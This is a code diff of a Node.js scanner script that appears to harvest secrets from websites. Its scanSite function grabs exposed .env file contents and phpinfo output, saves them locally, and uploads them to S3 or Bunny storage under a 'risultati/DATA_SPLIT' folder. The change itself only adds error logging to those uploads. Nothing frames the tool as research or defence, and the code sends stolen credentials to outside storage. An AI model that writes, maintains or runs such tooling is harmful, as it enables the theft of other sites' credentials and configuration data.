@@ -169,7 +169,7 @@ async function uploadFileToS3(localPath, remotePath, maxRetries = 3) {
         Body: body,
       }));
       log(`[S3 UPLOAD] OK: s3://${S3_BUCKET}/${s3key}`);
-      appendToS3Index(s3key).catch(() => {});
+      appendToS3Index(s3key).catch(e => log(`[S3 INDEX] Warning: ${e.message}`));
       return true;
     } catch (e) {
       const msg = e.message || String(e);
@@ -288,8 +288,8 @@ async function uploadFile(localPath, remotePath, maxRetries = 3) {
 async function uploadLog() {
   if (!LOG_ACTIVE || !LOG_PATH) return;
   try { await fs.promises.access(LOG_PATH); } catch (_) { return; }
-  if (AWS_S3) uploadLogToS3().catch(() => {});
-  if (BUNNY_STORAGE) uploadLogToBunny().catch(() => {});
+  if (AWS_S3) await uploadLogToS3().catch(e => log(`[LOG UPLOAD] S3 failed: ${e.message}`));
+  if (BUNNY_STORAGE) await uploadLogToBunny().catch(e => log(`[LOG UPLOAD] Bunny failed: ${e.message}`));
 }
 
 // ================================================================
@@ -549,7 +549,7 @@ async function scanSite(siteLink, isFallback = false) {
           const savedPath = path.join(NEW_PATH_EXTRACT, `ENV_NEW_${suffix}.txt`);
           await fs.promises.writeFile(savedPath, `${res.config.url}\n${content}`);
           const remote = `risultati/DATA_SPLIT/ENV_NEW_${suffix}.txt`;
-          uploadFile(savedPath, remote).catch(() => {});
+          uploadFile(savedPath, remote).catch(e => log(`  [ERR] Upload ENV failed: ${e.message}`));
           break;
         }
       }
@@ -693,7 +693,7 @@ async function scanSite(siteLink, isFallback = false) {
                       const savedPath = path.join(NEW_PATH_EXTRACT, `PHPINFO_${suffix}.txt`);
                       await fs.promises.writeFile(savedPath, `${item.url}\n${formattedOutput}`);
                       const remote = `risultati/DATA_SPLIT/PHPINFO_${suffix}.txt`;
-                      uploadFile(savedPath, remote).catch(() => {});
+                      uploadFile(savedPath, remote).catch(e => log(`  [ERR] Upload PHPINFO failed: ${e.message}`));
                     }
                   }
                 }
